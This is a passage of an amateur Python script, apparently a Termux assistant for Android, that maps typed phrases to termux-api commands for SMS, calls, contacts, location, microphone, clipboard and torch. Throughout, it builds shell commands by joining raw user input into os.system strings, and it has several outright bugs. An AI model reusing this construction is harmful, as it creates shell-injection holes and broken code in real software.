				os.system('termux-camera-info')
			elif c=="show my copied text":
				os.system('please wait showing copied text')
				os.system('termux-clipboard-get')
			elif c=="copy text":
				text_copy=input(yellow+"enter text which you want to copy :"+end)
				os.system('termux-clipboard-set'+' '+text_copy)
				os.system('termux-tts-speak the text was copied')
			elif c=="show my all contect list":
				os.system('termux-tts-speak please wait showing contect list')
				os.system('termux-contact-list')
			elif c=="print dilog":
				os.system('termux-tts-speak enter dilog to print')
				dilog_to=input(green+"input dilog to print :"+end)
				os.system('termux-dialog -for dilog'+' '+dilog_to)
			elif c=="download":
				os.system('termux-tts-speak enter url to download')
				url_download=input(yellow+"input url :"+end)
				os.system('termux-download'+' '+url_download)
			elif c=="get finger info":
				os.system('termux-tts-speak please enroll a fingerprint')
				os.system('termux-fingerprint')
			elif c=="show infrared frequencies":
				os.system('termux-tts-seak pleas wait showing')
				os.system('termux-infrared-frequencies')
			elif c=="show my location":
				os.system("termux-tts-speak pleas wait showing current location")
				os.system('termux-location')
			elif c=="play music":
				os.system('termux-tts-speak pleas enter a path and a name of music to play')
				music_path=input(read+"enter a path of music :"+end)
				os.chdir(music_path)
				os.system('ls')
				music_name=input(green+"please enter the name of music with dobule coads :"+end)
				os.system('termux-media-player'+' '+'play'+' '+music_path+music_name)
				os.system('termux-tts-speak you can type pause music to pause or stop to stop music and after pause you can play it agan')
			elif c=="pause":
				os.system('termux-media-player pause')
			elif c=="resume":
				os.system('termux-media-player play')
			elif c=="stop":
				os.system('termux-media-player stop')
				os.system('termux-tts-speak music was stopped')
				os.system('clear')
			elif c=="scane file":
				os.system('termux-tts-speak pleas wait scaning media')
				media_scane=input(green+"input file name to find :"+end)
				os.system('termux-media-scan -v -r'+' '+media_scane)
			elif c=="record mic":
				os.system('termux-tts-speak pleas wait sir')
				rec_lim=input(yellow+"enter time in sec 0 for unlimited :"+end)
				# recording
				os.system('termux-microphone-record'+' '+'-l'+' '+int(rec_lim))
				# exp in notification 
			elif c=="show notification":
				os.system('termux-tts-speak sir pleas be patiend')
				os.system('termux-notification')
			#exp in notification
			elif c == "y":
				print(" ")
			elif c=="remove notification":
				os.system('termux-notification-remove')
				os.system('termux-tts-speak notification removed')
			elif c=="show live sensor":
				os.system('termux-tts-speak pleas wait showing libe sensor')
				os.system('termux-sensor')
			elif c=="":
				print('')
			elif c=="send sms":
				os.system('termux-tts-speak please enter a number to sed a sms')
				name_sms=input(voilet+'number if more then one then type  , :'+end)
				text_sms=input(blue+'input text to send :'+end)
				os.system('termux-sms-send'+' '+'-n'+name_sms+' '+text_sms)
			elif c=="show sms":
				os.system('termux-tts-speak pleas wait showing sms')
				os.system('termux-sms-list')
			# calling section start here
			elif c=="make a call":
				try:
					write_person_name = input(green+"enter name or number of person : "+end)
					os.chdir('/sdcard/Android/data/com.maiis.main.files/')
					with open('datab.txt' , 'r') as oi :
						pass
						db_find = oi.read().find(write_person_name)
						s=oi.seek(db_find)
						db = (oi.readline())
						num_person = ''.join(x for x in db if x.isdigit())
						print(green+"calling to "+' '+num_person+end)
						os.system('termux-telephony-call'+' '+num_person)
				except ValueError:
					print(green+"calling to "+' '+write_person_name+end)
					os.system('termux-telephony-call'+' '+write_person_name)
			# calling section end here
					oi.close()
			elif c=="show info about cell":
				os.system('termux-tts-speak pleas waith showing all information about cell')
				os.system('termux-telephony-cellinfo')
			elif c=="show device info":
				os.system('termux-tts-speak please wait showing all info about device')
				os.system('termux-telephony-deviceinfo')
			elif c=="show toast":
				os.system('termux-tts-speak pleas enter a text to show toase')
				toast_no=input(yellow+"write text :"+end)
				os.system('termux-toast notification'+' '+toast_no)
			elif c=="turn torch on":
				os.system('termux-torch on')
				os.system('termux-tts-speak torch was turned on')
			elif c=="turn torch off":
				os.system('termux-torch off')
				os.system('termux-tts-speak torch was turned off')
			elif c=="torch sos":
				os.system('termux-torch on')
				time.sleep(1)
				os.system('termux-torch off')
				time.sleep(1)
				os.system('termux-torch on')
				time.sleep(3)
				os.system('termux-torch off')
			elif c=="vibrate":
				os.system('termux-tts-speak pleas enter a time')
